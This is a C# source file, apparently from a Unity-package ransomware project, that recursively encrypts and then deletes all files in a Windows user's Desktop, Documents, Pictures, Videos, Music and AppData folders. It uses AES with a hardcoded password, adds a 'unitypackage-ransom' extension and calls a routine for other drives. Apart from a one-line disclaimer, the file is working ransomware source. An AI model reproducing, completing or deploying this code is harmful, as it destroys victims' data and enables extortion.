using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace UnityExample.ThreadHandler
{
    //Dont use that for Illegal aktivity!
    //Github: https://github.com/none-development/unitypackage-ransomware
    internal class Crypto
    {

     
        private static string _APPDATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private static string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private static string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
        private static string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private static string MUSIC_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
        private static string VIDEOS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);


        /// <summary>
        /// Start the Ransomware
        /// </summary>
        /// <param name="a">Set it to True too Encrypt the System</param>

        internal static void Startencrypt(bool a)
        {
            if (a)
            {
                StartHandler();
                RemoveOtherPattions.OtherDrives();
            }
        }
        /// <summary>
        /// Thread Handler to make it Faster
        /// CPU goes to Max. Better Hardware === Faster Encryption
        /// </summary>

        public static void StartHandler()
        {
            Thread BASE_1 = new Thread(DESKTOP);
            Thread BASE_2 = new Thread(DOCUMENTS);
            Thread BASE_3 = new Thread(PICTURES);
            Thread BASE_4 = new Thread(VIDEOS);
            Thread BASE_5 = new Thread(MUSIK);
            Thread BASE_6 = new Thread(APPDATA);
            //Start Threads. They Terminat themself
            BASE_1.Start();
            BASE_2.Start();
            BASE_3.Start();
            BASE_4.Start();
            BASE_5.Start();
            BASE_6.Start();

        }

        //Everything on the DESKTOP
        private static void DESKTOP()
        {
            encryptStuff(DESKTOP_FOLDER);
        }

        //Somtiome it work
        private static void DOCUMENTS()
        {
            try
            {
                encryptStuff(DOCUMENTS_FOLDER);
            }
            catch { }
        }

        //Somtiome it work
        private static void PICTURES()
        {
            try
            {
                encryptStuff(PICTURES_FOLDER);
            }
            catch { }
        }
        //Somtiome it work
        private static void VIDEOS()
        {
            try
            {
                encryptStuff(VIDEOS_FOLDER);
            }
            catch { }
        }
        //Somtiome it work
        private static void MUSIK()
        {
            try
            {
                encryptStuff(MUSIC_FOLDER);
            }
            catch { }
        }

        private static void APPDATA()
        {
            try
            {
                encryptStuff(_APPDATA);
            }
            catch { }
        }





        // Cryto Stuff

        private static void encryptStuff(string sDir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
                    {
                        crypter(f, "Test1234"); 
                        File.Delete(f);
                    }

                }

                foreach (string d in Directory.GetDirectories(sDir))
                {
                    encryptStuff(d);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }
        private static string ENCRYPTED_FILE_EXTENSION = "unitypackage-ransom"; //Unity Ransomeware file extension, now in Random.
        private static void crypter(string inputFile, string password)
        {
            byte[] salt = GenerateRandomSalt();
            FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CBC;
            fsCrypt.Write(salt, 0, salt.Length);
            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fsIn = new FileStream(inputFile, FileMode.Open);
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {

                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }
            catch
            {

            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
                File.Delete(inputFile);

            }
        }

        public static byte[] GenerateRandomSalt() //generate salt
        {
            System.Random random = new System.Random();
            byte[] data = new byte[random.Next(14, 256)]; //Generate a Random Salt

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {

                    rng.GetBytes(data);
                }
            }

            return data;
        }
        
    }
}
